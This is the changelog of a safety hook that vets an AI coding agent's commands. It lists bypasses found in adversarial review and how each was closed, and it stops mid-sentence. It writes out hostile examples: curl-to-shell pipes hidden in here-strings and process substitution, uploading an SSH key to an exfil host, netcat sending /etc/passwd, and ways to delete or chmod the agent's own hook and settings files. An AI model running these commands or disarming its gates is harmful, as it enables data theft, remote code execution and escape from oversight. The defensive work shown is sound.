plugins.description: v0.2.38: the ENTRY boundary is now tri-state, matching the analysis side. detect.rs applied Decision::Ask thoroughly to ~25 sub-analysers for constructs it could not parse, but blastguard's own front door returned two answers: a matched tool whose operand could not be read (Bash with no/non-string tool_input.command, Write/Edit with no file_path) returned Allow, and a non-empty but unparseable stdin payload returned silently -- and a silent exit 0 IS an allow, so it allowed precisely the call it had failed to read. Those five sites now return Ask (hardened to Deny wherever no human can answer), classified as rule_id 'unreadable-operand'. EMPTY stdin and an UNMATCHED tool (Read, Grep, WebFetch) stay silent allows -- they are determined, not undetermined, and folding them in would prompt on every file read. Telemetry now runs AFTER the decision is printed and inside catch_and_log: record_violation ran first, so a panic in purely additive observability would unwind into run_hook's exit-0 and suppress the deny it was merely recording (LATENT, not live -- no reachable panic was found in that path, and it is recorded as latent rather than overstated). The test missing_or_unknown_input_is_allowed asserted two of the fail-opens as specification and was split: the unmatched-tool half survives as an_unmatched_tool_is_allowed, the two fail-open halves gained the opposite assertion. Prose corrected in the same commit (CLAUDE.md 4): main.rs's module docstring, README.md and README.ja.md all claimed 'empty/invalid input ... determined there is nothing to judge', which was true of empty and false of invalid. v0.2.37: merge-only version. Two parallel branches each shipped a distinct v0.2.36 — one made protected-path MODIFY an Ask (see below), the other migrated this crate off the removed Determination::Undetermined(Reason::new(..)) constructor to Determination::undetermined(..) when minting an Undetermined outside harness-core became a compile error. The merged tree contains BOTH, so it is neither v0.2.36; this number identifies the combination. v0.2.36: protected gate/config paths are now an Ask, not a flat Deny, for MODIFY shapes (Write/Edit/MultiEdit/NotebookEdit, > and >> redirect, cp/mv destination, tee, sed -i, sort -o, uniq): blastguard can establish that the target decides whether a gate runs, but not whether the incoming bytes arm or disarm it, and collapsing those into Deny recorded 'blastguard knows this is bad' for a case where it knew only 'blastguard cannot tell' (backlog a82274cb/8be68db2/a9ff687e). It also made every such change reachable only by a human hand-editing the file, which is strictly LESS auditable than an agent's edit (no diff, no test run, no commit trail). Not a softening: interactive::ask_available already hardens Ask->Deny in every headless/cron/worker/SDK context, so the autonomous-agent threat model is unchanged; only the interactive case moves, where the gate's owner sees the diff and decides. DESTRUCTION keeps its flat Deny (rm/unlink/rmdir/mv-source/chmod-disarm/recursive tree delete) because there the outcome follows from the command alone. The bypassPermissions escape hatch this rests on was MEASURED rather than assumed (Claude Code 2.1.197, headless): under both --permission-mode bypassPermissions and --dangerously-skip-permissions a PreToolUse ask did NOT execute the tool call, with allow/deny rig controls both ways; interactive.rs's module doc previously asserted that direction with no evidence and now carries the table and its two stated limits. Also fixes a redirect false positive: `2>&1` immediately followed by `)` was read as a truncating redirect to a file named `1`, because the fd-dup token scan and the target scan inside redirect_targets disagreed on where a token ends; both now share is_redirect_token_end(). Tests: 191 unit + all integration suites green; the protected-path tests now assert BOTH halves (Ask interactively, Deny once hardened), which is strictly stronger than the is_deny() they replaced. v0.2.35: doc-only fix — README.ja.md:31-33 claimed `.claude/settings.json` (among other config files) is *always* excluded (allow) from blastguard's destructive-op checks, contradicting `exclude.rs`'s actual precedence: `PROTECTED_GLOBS` (settings.json, hooks.json, hooks/**, .githooks/**, etc. — files that decide which gates/hooks run at all) OUTRANKS `ALLOW_GLOBS` and resolves those paths to unconditional Deny, never to the config-file exemption (backlog 333da6a8). README.ja.md now states the gate-control-file carve-out explicitly. No behavior change. v0.2.34: closes the launcher's (bin/blastguard) genuine fail-open when no per-platform binary is bundled for the host — the old launcher printed a stderr warning and silently `exit 0`'d with no stdout, byte-for-byte indistinguishable downstream from a real Allow verdict (backlog 2ec9d740; the exact gap v0.2.33's doc fix had only documented, not closed). The launcher now emits a PreToolUse hook-JSON verdict on the missing-binary path, mirroring `crate::interactive::ask_available`'s env-var resolution exactly: `BLASTGUARD_ASK=never` forces deny, `=always` forces ask, and `auto`/unset asks only when `CLAUDECODE=1` AND `CLAUDE_CODE_ENTRYPOINT=cli` (the one measured affirmatively-interactive shape) and denies otherwise — never a silent allow in any case. New `tests/launcher_missing_binary.rs` (5 tests) runs the real shell launcher as a subprocess against a binary-less tempdir with fully-controlled env, observed RED (empty stdout / unparseable JSON) against the pre-fix launcher before the change and GREEN after; `cargo test -p blastguard` (190 unit tests + all integration suites) and `cargo clippy -p blastguard --all-targets` stay clean. v0.2.33: doc-only fix — README.md/README.ja.md described panic/undetermined handling with a blanket "never breaks a turn" framing that conflated "stays silent (allow)" with "resolved by catch_unwind to deny", and understated the launcher's (bin/blastguard) real fail-open when no per-platform binary is bundled (warns to stderr, exits 0, no analyser runs at all). Docs now state the actual Decision::{Allow,Deny,Ask} resolution: empty/invalid input and unmatched tools are determined-nothing-to-judge (silent allow); an internal panic is undetermined and resolves to Deny via catch_unwind in analyse(); a missing bundled binary is a separate, genuine fail-open gap since no analyser exists to resolve anything in that case. No behavior change; see crates/blastguard/src/main.rs and crates/blastguard/bin/blastguard for the code these docs now match. v0.2.32: extends the high-blast Ask tier's category (A) — a `git push` refspec argument whose SOURCE side (the part before the first `:`, or the whole token if there is no `:`) begins with a literal `+` (`origin +main`, `origin +refs/heads/x:refs/heads/x`) now Asks exactly like `--force`/`-f`/`--force-with-lease`, since that `+` is git's own pre-flag force-refspec syntax and forces the update of that one ref identically. New `refspec_source_is_force` only inspects non-flag tokens, so `-u`/`--set-upstream` and its operand, a plain remote/branch/tag name, and a non-force colon refspec (`HEAD:main`, `src:dst`, no `+`) all stay silently Allow — verified by a dedicated anti-vacuity test. New cases in `tests/high_blast_tier.rs` (RED observed against a stashed pre-fix `detect.rs` via `tdd red`, GREEN via `tdd green`, `tdd oracle` reports `valid_fp_oracle: true`) cover the ask/deny-hardening shapes, the anti-vacuity allow-list, and non-regression of the existing flag-force/category-B/category-C arms; `cargo test -p blastguard` (all suites) and `cargo clippy -p blastguard --all-targets` stay clean. v0.2.31: adds a CONSERVATIVE high-blast-radius Ask tier for novel destructive/irreversible Bash shapes the existing deny-list has no rule for — folded into `detect_bash` right before the per-command accumulator's Allow fallthrough, so any pre-existing Deny (protected path, egress, fork bomb, recursive rm, find -delete/-exec rm) still outranks it (Deny > Ask > Allow). Three narrow, individually-MEASURED gaps: (A) `git push` carrying a force flag (`--force`/`-f`/`--force-with-lease[=…]`) — `analyze_git`'s `match` had no `"push"` arm at all, so a history-rewriting force-push fell to the `_ => Allow` catch-all; a normal (non-force) push is unaffected. (B) `curl`/`wget` uploading local file content (`-d @file`/`--data-binary @file`/`-F name=@file`/`-T`/`--upload-file`, the exact shape the pre-existing `fetch_exfil_upload` already denies) to a URL with NO literal `://` scheme — curl/wget both default a bare `host/path` operand to `http://`, so the upload still happens, but the pre-existing rule's own scheme gate never even looks at the flags in that case; `upload_flag_operand` is factored out of `fetch_exfil_upload` so both the scheme-present Deny and the scheme-absent Ask share one flag-detection path. (C) a plain, non-recursive `rm`/`unlink` of a single operand that climbs OUT of the tree via a leading `../` with no preceding `cd`/`pushd` to explain where it lands — judged on the ALREADY cwd-resolved segment `detect_bash`'s existing per-segment loop produces (not a fresh top-level scan), so a `cd` that lexically resolves the `..` back to an ordinary place (`cd .githooks && rm ../src/build.o`) correctly stays Allow, matching a pre-existing pinned test for that exact shape. Measured, not assumed: `rm -rf`/wildcard/`find -delete`/`find -exec rm` needed no new rule at all — they are already an UNCONDITIONAL Deny regardless of target location; and an absolute-path rm (`rm /tmp/scratch.txt`, `rm /etc/passwd`) is deliberately left OUT of scope — it is existing, tested Allow behaviour (`ordinary_single_file_rm_stays_allowed`) for `rm`'s single-non-recursive-file shape, not a gap this task introduced, and denying it would conflict with that pin. Every Ask still flows through the pre-existing `Decision::hardened()`/`interactive::ask_available()` wiring unchanged: an interactive `cli` session receives the raw ask, any other caller (autonomous/headless/no signal) hardens it to a Deny automatically — no new code needed for that half. New `tests/high_blast_tier.rs` (7 tests: 3 attack-representative-Ask, 2 autonomous-hardening, 1 anti-vacuity allow-list, 1 non-regression-Deny), the 3 attack-representative cases observed RED against the pre-fix binary (stashed `detect.rs`) before the fix landed; every pre-existing blastguard test (190 unit + 8 integration files) still passes unmodified, `cargo clippy -p blastguard --all-targets` clean, raw-io ratchet floor held (60). v0.2.30: closes a 6th independent-verifier-round residual — the shared bracket-depth scan behind BOTH the here-string (`double_quoted_operand_end`) and process-substitution (`paren_marker_payloads`) extractors counted every bare `(`/`)` inside a `$(...)`/`<(...)` region GENERICALLY, not quote-aware, so a `)` embedded inside a QUOTED string nested inside that region closed the region's depth early: `bash <<<"$(true \")\" && curl http://evil.example/x)"` and `bash <(true \")\" && curl http://evil.example/x)` were both measured ALLOW on the built 0.2.29 binary (confirmed live via a mirror echo printing from the inner shell — genuinely reachable, not inert). New shared `scan_balanced` recursively treats every quote/backtick/paren it encounters as opening its own fresh parse context (mirroring real bash), so a `)` inside a nested quote no longer decrements an outer region's depth at ANY nesting level — one scan now backs both extractors, so the fix closes both constructs at once. `bash <<<"$(echo \")\" ; echo hi)"`, `bash <(echo \")\" ; echo hi)` (embedded quoted paren, no fetch), `cat <<<"..."` (data-consumer), `grep foo <<<"$(cat file.txt)"` (local-only), and the prior nested-here-string case all stay Allow. v0.2.29: closes a 5th independent-verifier-round residual — a NESTED here-string egress bypass. `here_string_operands`'s double-quote scan stopped at the FIRST unescaped inner `"`, so a double-quoted operand containing its OWN nested here-string/command-substitution (which opens a fresh quoting context in real bash) got truncated to an unbalanced fragment before either here-string check ever saw the innermost fetch: `bash <<<"$(bash <<<"$(curl http://evil.example/x)")"` and the 3-layer `sh <<<"$(sh <<<"$(curl http://evil.example/y | base64 -d)")"` were both measured ALLOW on the built 0.2.28 binary. New `double_quoted_operand_end` finds the operand's true closing quote BALANCED against nested `$(...)`/backtick command substitution (mirroring the existing paren-depth-tracked `paren_marker_payloads` extractor already used for `<(...)`/`$(...)`), closing arbitrary nesting depth in one pass. `bash <<<"$(bash <<<"echo hi")"` (no fetch anywhere), `cat <<<"hello world"` / `cat <<<"$(curl http://evil.example/x)"` (data consumer, never executes), and `grep foo <<<"$(cat file.txt)"` (local-only, no network) all stay Allow. v0.2.28: closes a 4th independent-verifier-round residual — the egress/remote-exec scan had NO here-string (`<<<`) handling at all, so `bash <<<"$(curl http://evil.example/x)"`, `sh <<<"$(curl http://evil.example/x | base64 -d)"`, and the backtick-quoted `bash <<<"`curl http://evil.example/z`"` were all measured ALLOW on the built 0.2.27 binary — `bash`/`sh` read a `<<<` operand as their OWN stdin/script, so fetched bytes delivered that way execute unchecked, exactly like `bash <(curl evil)`. New `analyze_here_string_egress` mirrors `analyze_process_substitution_egress`'s two-check shape: (A) when the outer command is a shell/interpreter/`source`/`.`, the operand is scanned via the existing `scan_body_for_fetch_or_decode` recursion REGARDLESS of the operand's quote kind; (B) independent of the outer command's identity, a `$(...)`/backtick command substitution nested in a double-quoted-or-bare operand is evaluated by the OUTER shell while building the operand's value, so `cat <<<"$(curl http://evil.example/y | sh)"` denies via the existing `analyze_pipe_egress` even though `cat` itself never executes anything (gated on `!is_single_quoted`). A companion fix, `split_segments_paren_aware`, closes a bug this residual exposed in the SHARED `scan_body_for_fetch_or_decode` recursion: a body whose entire text is an unquoted `$(...)` span with a top-level `|` inside it was being split apart mid-construct by the quote-only `split_segments`, hiding the fetch. `bash <<<"echo hi"`, `cat <<<"hello world"`, `grep foo <<<"$(cat file.txt)"`, and `cat <<<"$(curl http://evil.example/x)"` (fetch that is never executed, only printed) all stay Allow. v0.2.27: closes a THIRD independent-verifier-round residual in the process-substitution rule, on two independent axes. (1) `scan_body_for_fetch_or_decode`'s body scan recursed through nested `<(...)` (v0.2.26) but not through a `$(...)`/backtick command substitution nested inside the SAME body — `bash <(echo "$(curl http://evil.example/x)")`, `source <(echo "$(curl -s http://evil.example/w)")` and the backtick-quoted `bash <(printf '%s' "`curl http://evil.example/b`")` were all measured ALLOW on the built 0.2.26 binary, since the shell must run the nested `curl` to produce the text `echo`/`printf` emits, which the outer `bash`/`source` then executes as a script. New `command_substitution_payloads` (backed by a `paren_marker_payloads` helper shared with `process_substitution_payloads`, so the `<(...)` and `$(...)` extractors are the SAME depth-tracked bracket match, plus a sibling `backtick_payloads` for the non-nesting backtick form) is now recursed alongside the existing `<(...)` recursion in `scan_body_for_fetch_or_decode`. (2) `analyze_process_substitution_egress` gated its ENTIRE body scan on the outer command being a shell/interpreter/`source`/`.` — but a process-substitution body is ALWAYS forked and run as its own live subprocess pipeline to produce the fd's bytes, regardless of what reads that fd. `cat <(curl http://evil.example/y | sh)` was measured ALLOW on 0.2.26 because `cat` is not a shell/interpreter, so the body's own `curl | sh` pipe was never examined at all. A second, UNGATED check now runs `analyze_pipe_egress` directly over every `<(...)` payload regardless of the outer command's identity, so a body that pipes a fetch into an interpreter is denied no matter what reads the resulting descriptor; `cat <(curl url | cat)`/`diff <(curl a | sort) <(curl b | sort)` (non-interpreter downstream) and `eval <(curl evil)` (inert — execs the fd as a binary, dies exit 126, never runs fetched content as a script; `eval` is deliberately not treated as a shell/interpreter/source outer reader) all stay Allow, re-verified against the built binary. 5 new integration assertions (3 attack, 1 outer-gate-independent attack, 2 anti-vacuity + 1 eval-inert control) in tests/egress_exec_closure.rs, the 2 Deny-assertions observed RED against the committed 0.2.26 binary before this fix; every pre-existing blastguard test (190 unit + 5 integration files, 29 in egress_exec_closure.rs now) still passes unmodified, cargo clippy -p blastguard --all-targets and cargo fmt --check both clean, raw-io ratchet floor held (60). v0.2.26: closes ONE trivially-reachable hole a second independent-verifier round found in v0.2.25's process-substitution rule — a direct incompleteness, not a new attack class. `analyze_process_substitution_egress` scanned a `<(...)` body's fetch/decode word DIRECTLY (its first command word only), so appending a trailing pipe stage or nesting another substitution defeated it entirely: `bash <(curl evil)` denied, but `bash <(curl evil | base64 -d)`, `bash <(curl evil | cat)`, `bash <(curl evil | grep x)`, `source <(curl evil | base64 -d)` and `bash <(bash <(curl evil))` were all measured ALLOW on the built 0.2.25 binary. Root cause traced one level deeper than the scan itself: `split_statements_into_pipe_stages` (shared by the pipe-egress and process-sub rules) had no paren-depth tracking, so a `|` INSIDE a `<(...)` was read as a TOP-LEVEL pipe boundary — `bash <(curl evil | base64 -d)` was split into `"bash <(curl evil "` and `" base64 -d)"` before the process-sub extractor ever ran, leaving an unterminated `<(` in the first fragment and a stray `)` with no opener in the second, so no payload was ever extracted to scan. The splitter now tracks unquoted `(`/`)` depth and only treats `;`/`&&`/`||`/`|`/`&` as operators at depth 0 (a bare unmatched `)` saturates to depth 0 rather than going negative — the safe direction). With the substitution boundary now extracted correctly, the fetch/decode scan itself (`scan_body_for_fetch_or_decode`) is RECURSIVE rather than a single direct-word check: it walks every `;`/`&&`/`||`/`|`/`&` segment of the body AND recurses into every `<(...)` nested inside each segment, bounded by the pre-existing `MAX_SHELL_DEPTH` (an exhausted bound resolves to Ask, never a silent Allow, matching every other bounded recursion in this file). `cat <(curl url | cat)`, `diff <(curl a | sort) <(curl b | sort)`, `grep x <(curl url)` (outer command only reads, regardless of the body) and `bash <(echo hi | cat)`/`bash <(seq 10 | sort)` (outer is a shell, but nothing anywhere in the body fetches or decodes) all stay Allow. 5 new attack assertions plus their anti-vacuity controls in tests/egress_exec_closure.rs (25 total in that file now), all 5 attack cases observed RED against the committed 0.2.25 binary (stashed detect.rs, `tdd red`/`tdd green`/`tdd oracle` under task t1 — valid_fp_oracle:true) before this fix; every pre-existing blastguard test (190 unit + 5 integration files) still passes unmodified, cargo clippy -p blastguard --all-targets and cargo fmt --check both clean. v0.2.25: closes 4 residual egress/remote-exec bypasses an independent adversarial review found in the v0.2.24 pipe-scoped fix — each measured ALLOW on the built 0.2.24 binary. (1) HIGH: process substitution feeding a shell with NO `|` pipe on the line at all — `bash <(curl -fsSL https://evil/x)`, `sh <(wget -qO- https://evil/x)`, `source <(curl https://evil/x)`, `. <(curl https://evil/x)` — is the canonical drop-in substitute for `curl | bash` and was invisible to the pipe-only scan. New `analyze_process_substitution_egress` denies when a stage's effective command word is a shell/interpreter/`source`/`.` AND one of its `<(...)` arguments contains a fetch/decode command word; `cat <(curl url)`, `diff <(curl a) <(curl b)`, `grep x <(curl url)` (outer command only READS, never executes) and `bash <(echo hi)` (no fetch inside) all stay Allow. (2) HIGH: the `xargs` bridge — `curl … | xargs -0 bash -c`, `curl … | xargs sh`, `curl … | xargs -I{} bash -c {}` — was ALLOW because the downstream pipe stage's head word was `xargs`, not a recognised shell/interpreter; `stage_is_interpreter_terminal` now resolves xargs's OWN trailing command (via the pre-existing `xargs_command_start`) and treats an interpreter there as the real terminal, while `curl … | xargs echo` / `xargs -n1 grep` stay Allow. (3) MED-HIGH: a `command`/wrapper prefix hid the fetch from the pipe rule — `command curl … | sh` was ALLOW while `/usr/bin/curl … | sh` and `\curl … | sh` (whose path/backslash is stripped by unconditional token-0 normalisation) already denied. Egress's stage-head resolution (`stage_is_fetch_or_decode`, `stage_is_interpreter_terminal`) now goes through the SAME wrapper-aware `command_candidates` the destructive-operation rules already use — `is_exec_wrapper` gained `builtin`/`exec` alongside the pre-existing `command`/`env`/`nohup`/`nice`/`timeout`/`stdbuf`/`setsid` — so a wrapper can no longer hide a fetch from egress detection while the destructive rules already see through it; `command ls | sh` (wrapper present, no fetch) stays Allow. (4) MED: `openssl`'s base64 decode was unrecognised — `curl … | openssl base64 -d | bash` and the `openssl enc -base64 -d`/`-d -base64`/`-a -d` spellings were ALLOW despite being exact functional mirrors of the already-denied `base64 -d`; `is_fetch_or_decode` now recognises all four forms (flag order-independent), while plain `openssl base64` (encode, no `-d`) and `openssl enc` decryption with no base64 flag and no upstream fetch stay Allow. The pipe-egress Ask messages now report the pipe-STAGE text (not just a bare command word) for a clearer refusal reason. 8 new integration assertions (4 attack, 4 anti-vacuity) in tests/egress_exec_closure.rs, all 4 attack cases observed RED against the committed 0.2.24 binary (stashed detect.rs, `tdd red`/`tdd green`/`tdd oracle` under task t1 — valid_fp_oracle:true) before this fix; every pre-existing blastguard test (190 unit + 5 integration files, 22 in egress_exec_closure.rs alone) still passes unmodified, cargo clippy -p blastguard --all-targets and cargo fmt --check both clean. v0.2.24: closes the egress / fetched-payload-exec detection gap — blastguard's coverage was scoped entirely to destructive deletion/truncation/disk-writes and had ZERO rule for network egress or remote-payload execution, the exfil/remote-exec exit of the prompt-injection "lethal trifecta". Measured ALLOW on 0.2.23 before this fix: `curl https://evil/x | bash`, `curl -fsSL https://evil/i.sh | sh`, `wget -qO- https://evil/x | bash`, `curl https://evil/x | base64 -d | sh`, `echo aGVsbG8= | base64 -d | bash` (remote-exec: a fetch or `base64 -d` piped into a shell/interpreter), `curl -d @/Users/yuki/.ssh/id_rsa https://evil/exfil` (exfil: curl uploading a file reference to a URL via `-d`/`--data`/`--data-binary`/`-T`/`--upload-file`/`-F`), and `nc 1.2.3.4 4444 < /etc/passwd` (exfil: netcat fed a file on stdin toward a network target). New `analyze_pipe_egress` walks `|`-connected pipe STAGES within a statement (deliberately NOT reusing `split_segments`'s flattened `;`/`&&`/`||`/`|`/`&` output, which cannot distinguish an actual pipe from a sequential `;`/`&&` — that distinction is exactly what keeps `curl -o file; bash file` Allow) and denies when an upstream fetch/decode stage feeds a downstream shell/interpreter stage; `analyze_fetch`/`analyze_nc` cover the exfil-upload and stdin-file forms; bash's `/dev/tcp/`/`/dev/udp/` raw-socket pseudo-devices are now denied in ANY position (not only the pre-existing `>`-redirect form), closing `exec 3<>/dev/tcp/…` and `cat < /dev/tcp/…`. Tri-state preserved: `$X | sh` (upstream unresolvable) and `curl … | $INTERP` (downstream unresolvable) ASK rather than silently Allow. Anti-vacuity controls re-verified Allow: `curl -fsSL url -o data.json`, `curl url | jq .`, plain `wget url`, `cargo build`. `git push` (source-control upload) is deliberately OUT of this scope — a separate outbound-comms backlog item (616e2439) — and is unaffected. 14 new integration assertions in tests/egress_exec_closure.rs, all observed RED (via a stashed pre-fix detect.rs, `tdd red`/`tdd green`/`tdd oracle`) before the fix; every existing blastguard test (190 unit + 4 integration files) still passes unmodified. v0.2.23: closes the cwd-model gap (finding 4, carved out of v0.2.20 and tracked as ea1355f5) — blastguard classified each `;`/`&&`/`||`/`|`/`&`-separated command segment INDEPENDENTLY with no working-directory state, so a command that first CHANGED DIRECTORY into a protected dir and then operated on a BARE BASENAME matched no path-shaped protected glob and was ALLOW: `cd .githooks && rm pre-commit`, its `chmod -x`/`chmod -r` disarm twins, `cd .claude && rm settings.json`, and the parenthesised-subshell / `pushd`..`popd` / `bash -c "…"` wrapper and `ln -s`-alias-into-a-protected-dir forms were all measured ALLOW on v0.2.21 (2 attacker tokens). `detect_bash` now tracks a cwd prefix left-to-right (`CwdState` Root/Known/Unknown): a `cd`/`pushd` into a protected dir (or through a statically-readable `ln -s` alias) taints later segments, and a following `rm`/`chmod`/`unlink`/`rmdir` on a bare basename has that operand rewritten to `dir/operand` before the UNCHANGED protected-path rules run, landing on the exact same Deny as the direct-path spelling. A `popd`/dynamic/unresolvable cwd resolves to `Unknown` → Ask (never a silent Allow) for those four verbs on a bare basename, per the fail-closed invariant. Normal two-stage work (`cd src && cargo build`) and read-only access to a protected file stay Allow; `Decision` precedence (Deny > Ask > Allow) and `VerdictAcc` are untouched. Residual (same task, ea1355f5 round 2): the rewrite only substituted a bare-basename operand (no `/` at all), so a RELATIVE operand that still resolves back into the tracked directory — `cd .githooks && rm ./pre-commit`, `cd .githooks && rm sub/../pre-commit` — kept evading, even though the direct-path proof (`rm .githooks/./pre-commit`) was already denied. The rewrite now joins ANY relative (non-absolute, non-`~`) target operand against the tracked directory and lexically normalizes it (`.`/`..` resolved) before the protected-path rules run; a relative operand that lexically escapes the tracked directory into somewhere ordinary (`cd .githooks && rm ../src/build.o`) stays Allow, and the `Unknown`-cwd Ask now covers a relative-with-slash operand the same way it already covered a bare basename. 17 tests total in tests/cwd_prefix_bypass_closure.rs (12 from the first round + 5 new: 2 relative-operand attack forms, 1 fail-closed dynamic-cwd check, 1 direct-path anti-vacuity control, 1 escape-stays-Allow control) — the 3 residual attack/fail-closed tests observed RED on the pre-residual-fix binary. v0.2.21: closes round 4 of the adversarial review — four ways to disarm a protected gate/hook/policy path that were all measured ALLOW on v0.2.20, each proven against the built binary. (1&2) CRITICAL: `sort` and `uniq` sat in the READ_ONLY_COMMANDS exemption, which waves a verb through without inspecting operands — but both have OUTPUT-FILE forms. `sort -o .githooks/pre-commit /dev/null` (and `-o<path>`/`--output=<path>`/clustered `-bo`) writes the named file IN PLACE, and `uniq /dev/null .githooks/pre-commit` writes its 2nd positional operand (each proven: truncated a real file to 0 bytes). Both are removed from the read-only list (it is a list of verbs that ONLY read; these do not) and given dedicated arms `analyze_sort`/`analyze_uniq` that Deny the output-onto-a-protected-path form and leave pure reads / non-protected outputs Allow — `sort data.txt`, `sort -o out.txt in.txt`, `uniq a b`, `sort .githooks/pre-commit` (read) all stay Allow. (3) HIGH: `mode_removes_exec` only flagged removal of the EXEC bit, but a shell-script hook is run via its shebang and the interpreter must READ the file — `chmod -r hook.sh` (mode -wx--x--x) makes `./hook.sh` fail exit 126 despite the exec bit. `chmod -r .githooks/pre-commit` and `chmod 311 .githooks/pre-commit` (owner read bit 4 clear, exec set) were ALLOW. New `mode_removes_read` twin (octal owner read bit; symbolic `-r` / read-omitting `=`) gates the protected-target deny alongside exec, so a mode that clears EITHER read or exec disarms. `chmod +x`/`755`/`700` (installing/arming a hook, both bits kept) and any chmod on a non-protected path stay Allow. (4) MEDIUM (precondition-gated): `rm`'s container check (`protected_tree_deny`) was invoked only `if recursive`, so `-d`/`--dir` — which removes an EMPTY directory — slipped past. `rm -d .claude/hooks`, `rm --dir .git/hooks`, `rm -d .claude` were ALLOW; exploitable when the protected dir is empty (fresh scaffold, inline-hook repos). The container check now fires for `recursive OR dir_flag`; `rm -d emptydir` on a non-protected path stays Allow. New deny paths reuse the existing `protected-path` / `protected-path-disarm` / `protected-tree-destroy` rule ids (a sort/uniq write IS a protected-path write; a chmod read-strip IS a disarm) and are all added to the rule_id completeness test. NO existing test was weakened, retargeted or ignored; 8 new integration assertions in tests/round4_bypass_closure.rs were observed RED before the fix, every group carries a known-DENY (`rm -rf .githooks`) and known-ALLOW (`ls -la`) control. v0.2.20: closes round 2 of the adversarial review of the protected-path rule — five ways to reach a protected gate/hook/policy file that were all measured ALLOW on v0.2.19. (1) CRITICAL: `exclude::normalize` collapsed `//` and `/./` but not `..`, and that was NOT the restrictive side the old comment claimed it was: a `..` breaks the multi-component protected globs (`.claude/settings.json`) because glob matching splits on every literal `/`, while the ALLOWLIST's `.claude/**` swallows it whole — so the path failed the protected list and KEPT its exemption. `Write .claude/x/../settings.json` and `Write /Users/yuki/.claude/plugins/../settings.json` were ALLOW on v0.2.18 AND v0.2.19 while the plain spelling was DENY, and the same trick worked for rm/mv/cp/install/sed -i/tee/chmod/Edit. `..` is now resolved LEXICALLY (no `canonicalize`, no I/O); the asymmetry that caused it is fixed in both directions — `is_protected_path` matches the collapsed AND the resolved spelling (a union, so resolution can never remove a match), and `is_config_file` matches only the resolved one and REFUSES outright when a `..` survives, so an unresolvable path now fails the allowlist too. A relative `..` that escapes the root is kept visible rather than silently dropped. (2) `git rm` had no arm at all: `git rm .githooks/pre-commit`, `git rm -rf .githooks`, `git rm -r -f .claude` and `git rm --cached .claude/settings.json` all reached `_ => Allow`, a one-command disarm equal to the already-denied `rm -rf .githooks`. (3) The unknown-verb catch-all (`other => Allow`) let whole families through — `unlink`, `rmdir`, `patch`, `ed`/`ex`, `awk -i inplace`, `gzip`/`bzip2`/`xz`, `rsync --delete`, `ditto`, `tar -x -C`, `unzip -d`. Fixed with a GENERAL principle rather than a destructive-verb list: an unrecognised verb with a protected operand is "cannot determine" and resolves to Ask, exempted by a READ-ONLY verb list that rots CLOSED (a verb nobody thought of asks; the other direction is a free bypass the day it is invented). `cat`/`grep`/`ls`/`jq`/`head` on a gate config stay Allow, as do shells, interpreters and `source`. `unlink`/`rmdir` get explicit Deny arms as the literal twins of `rm`. (4) The round-1 claim that "a wildcard operand is denied anyway" held only inside `analyze_rm`, which has its own backstop: `chmod 000 .claude/*`, `chmod 644 .claude/*` and `mv .claude/* /tmp/` were ALLOW because a token containing `*` cannot match a literal path glob and nothing caught the fall-through. New `protected_glob_deny` judges the operand's literal PREFIX (`.claude/*` cannot expand outside `.claude`), wired into chmod, cp/mv/install/ln, `git rm` and `unlink`/`rmdir`. (5) git spellings whose twins were already denied: `git stash -a`/`--all`/`push -u` (the flag scan was `.find(|t| !t.starts_with('-'))`, i.e. it skipped exactly where the destruction was — functionally `git clean -fdx`), `git checkout .`/`HEAD .` without the literal `--` the rule was gated on, `git switch -f`/`--discard-changes` (the other half git split `checkout` into; round 1 adopted `restore`'s twin and left this one), plain `git clean -f` without `-d`/`-x` (which still deletes every untracked file), and a `find -exec mv {} …` whose source operand is the unresolvable placeholder `{}` (now Ask). New rule ids: `unknown-verb-protected-path`, `protected-path-wildcard`, `find-exec-placeholder-operand`, `git-switch-force`, `git-stash-untracked`, plus `git-stash-discard` which round 1 added a rule for and never registered, so every stash-discard deny had been filed as "unknown". NO existing test was weakened, retargeted or ignored; 19 new integration assertions in tests/round2_bypass_closure.rs were observed RED before the fix, and every group carries both a known-DENY and a known-ALLOW control. Over-block guard: `rm build/x.o`, `mv src/a.rs src/b.rs`, `chmod +x scripts/run.sh`, `git checkout main`, `git checkout -b foo`, `cp <protected> /tmp/backup`, `. ~/.bashrc` and ordinary source edits were re-verified Allow against the built binary. Finding 4 (no cwd model: `cd .githooks && rm pre-commit`) is deliberately OUT of scope and queued separately. v0.2.19: closes the DISARM-BY-NON-WRITE class — neutralising a protected gate/hook file WITHOUT writing to it. Every rule through v0.2.18 asked "do bytes land ON this file?", so deleting it, moving it out of the directory its loader reads, clearing its exec bit or restoring it from the index were all invisible. (1) `analyze_rm` now classifies its TARGET before asking about blast radius: the config-file exemption was consulted without the `is_protected_path` precedence v0.2.18 established everywhere else, and `.claude/**` is on the ALLOW list — so `rm .claude/settings.json`, `rm -rf .claude` and even `rm -rf /Users/yuki/.claude` were Allow while the identical `rm -rf .githooks` was Deny. (2) `analyze_copy_move` models the source/destination asymmetry explicitly: `mv` UNLINKS its sources, so a protected `mv` SOURCE is a disarm (`mv .githooks/pre-commit /tmp/x`, `mv .claude/settings.json .claude/settings.json.disabled`), while `cp`/`install`/`ln` only READ theirs and ordinary backups stay Allow. (3) New `exclude::holds_protected_paths` answers "is this the DIRECTORY that holds protected files?" — derived mechanically from the ancestor prefixes of PROTECTED_GLOBS, not a second hand-written list — because `.claude` itself matches no protected glob. A recursive `rm` of such a directory is Deny (everything under it goes); a recursive `cp` INTO one is ASK, since the landing set lives on disk and is not derivable from the command line. (4) Mirror gaps closed: `git checkout -- <path>` now denies like its `git restore` twin, and `tee -a` onto a protected target denies like its `>>` twin. `chmod` gained a mode analysis (`-x`, `a-x`, `000`, `644`, `444` on a protected hook is Deny; `+x`, `755`, `700` — installing a hook — stays Allow), with an unparseable mode resolving restrictively. New rule ids: `protected-path-disarm`, `protected-tree-destroy`, `protected-landing-unenumerable`, `git-checkout-pathspec`. One pre-existing assertion was FLIPPED, not deleted: `allows_rm_of_config_files_even_when_destructive` pinned `rm -rf .claude` as Allow, i.e. it had written the fail-open down as the specification; it now asserts Deny and keeps a `.config` control proving the exemption itself is intact. v0.2.18: closes the four round-2 adversarial-verifier bypasses of the protected-path rule. (1) The protected glob set is now matched CASE-INSENSITIVELY (`.CLAUDE/Settings.json`, `DENY.TOML`, `.ZSHRC` are the same file on a case-insensitive filesystem); the ALLOW set stays case-sensitive on purpose, since folding it would exempt more rather than deny more. (2) `exclude::normalize` collapses `//` and `/./`, which the kernel already treats as one separator. (3) New `cp`/`mv`/`install`/`ln` and `sed -i` arms: the dispatch only had DELETE/TRUNCATE rules, so overwriting a 